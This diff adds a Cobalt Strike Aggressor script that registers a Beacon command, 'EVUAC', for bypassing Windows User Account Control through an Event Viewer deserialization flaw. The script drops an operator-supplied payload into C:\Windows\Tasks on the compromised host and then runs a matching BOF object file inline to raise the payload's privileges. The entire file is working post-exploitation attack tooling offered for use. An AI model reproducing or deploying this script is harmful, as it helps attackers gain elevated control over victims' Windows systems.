@@ -1,0 +1,50 @@
+beacon_command_register(
+"EVUAC", 
+"Bypass UAC via Event Viewer deserialization vuln.", 
+"Usage: EVUAC Payload Env  \r\n run 'shell set |findstr \"LOCALAPPDATA\"' get env variable first");
+
+global('$env');
+
+alias EVUAC {
+	#bshell($1, "set | findstr \"LOCALAPPDATA\"");
+    local('$barch $handle $data $args');
+	if(size(@_) != 3)
+	{
+		berror($1, "Incorrect usage!");
+		berror($1, beacon_command_detail("EVUAC"));
+		return;
+	}
+
+    # figure out the arch of this session
+    $barch  = barch($1);
+
+    $Bin = $2;
+    $Env = $3;
+    $BinFileName = split("\\\\", $Bin)[-1];
+    $BinFileName = split("/", $BinFileName)[-1];
+    $Binhandle = openf($Bin);
+    $Bindata = readb($Binhandle, -1);
+    if(strlen($Bindata) == 0){
+        berror($1, "File is empty or not exit. Please use a valid file.");
+        return;
+    }
+    bupload_raw!($1, "C:\\Windows\\Tasks\\" . $BinFileName, $Bindata);
+    closef($Binhandle);
+    blog($1, "Dropped Bin payload to \"C:\\Windows\\Tasks\" folder.");
+
+    # read in the right BOF file
+    $handle = openf(script_resource("EventViewerUAC. $+ $barch $+ .o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+   
+    # pack our arguments
+    $args   = bof_pack($1, "ZZ", $BinFileName ,$Env);
+
+    # announce what we're doing
+    btask($1, "Running EventViewerUAC BOF");
+    
+    # execute it.
+    beacon_inline_execute($1, $data, "go", $args);
+
+}
+
